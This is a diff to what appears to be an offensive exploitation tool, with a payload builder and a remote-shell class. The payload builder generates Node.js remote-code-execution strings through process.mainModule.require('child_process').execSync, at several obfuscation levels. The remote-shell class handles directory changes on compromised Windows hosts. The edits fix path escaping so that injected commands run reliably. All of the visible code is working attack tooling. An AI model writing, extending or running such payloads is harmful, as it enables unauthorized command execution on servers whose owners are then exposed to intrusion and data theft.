@@ -117,8 +117,10 @@ class PayloadStrategy:
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
-            cwd_esc=cwd.replace("\\","\\\\").replace("'","\\'")
-            cwd_opt=f",cwd:'{cwd_esc}'"
+            # Use forward slashes — Windows Node.js accepts them, and they
+            # don't get eaten by the JSON→JS escaping chain
+            cwd_fwd=cwd.replace('\\','/')
+            cwd_opt=f",cwd:'{cwd_fwd}'"
         # Build require chain based on obfuscation
         if obf_level==0:
             rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}})"
@@ -139,8 +141,8 @@ class PayloadStrategy:
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
-            cwd_esc=cwd.replace("\\","\\\\").replace("'","\\'")
-            cwd_opt=f",cwd:'{cwd_esc}'"
+            cwd_fwd=cwd.replace('\\','/')
+            cwd_opt=f",cwd:'{cwd_fwd}'"
         if obf_level==0:
             rce=f"process.mainModule.require('child_process').execSync('{ce}',{{timeout:8000{cwd_opt}}}).toString().substring(0,{max_bytes})"
         elif obf_level<=2:
@@ -899,22 +901,21 @@ class AdvancedShell:
                     elif cmd.startswith('cd '):
                         path=cmd.split(' ',1)[1].strip()
                         if not path:continue
-                        # Resolve path: if relative, join with current_dir
                         if self.target_os=='windows':
                             if path=='..' and self.current_dir:
-                                # Go up one level
                                 parts=self.current_dir.rstrip('\\').rsplit('\\',1)
                                 new_dir=parts[0] if len(parts)>1 else self.current_dir
                             elif path=='.':
                                 new_dir=self.current_dir or ''
-                            elif ':\\' in path or path.startswith('\\\\'):
-                                new_dir=path  # absolute path
+                            elif ':\\' in path or path.startswith('\\\\') or ':/' in path:
+                                new_dir=path
                             elif self.current_dir:
                                 new_dir=self.current_dir.rstrip('\\')+'\\'+path
                             else:
                                 new_dir=path
-                            # Verify directory exists
-                            o=self.execute(f'cd /d "{new_dir}" && cd')
+                            # Use forward slashes to avoid JSON→JS escaping issues
+                            verify_path=new_dir.replace('\\','/')
+                            o=self.execute(f'cd /d "{verify_path}" && cd')
                             if o and '[-]' not in o:
                                 lines=[x for x in o.strip().split('\n') if x.strip() and 'cannot find' not in x.lower()]
                                 if lines:
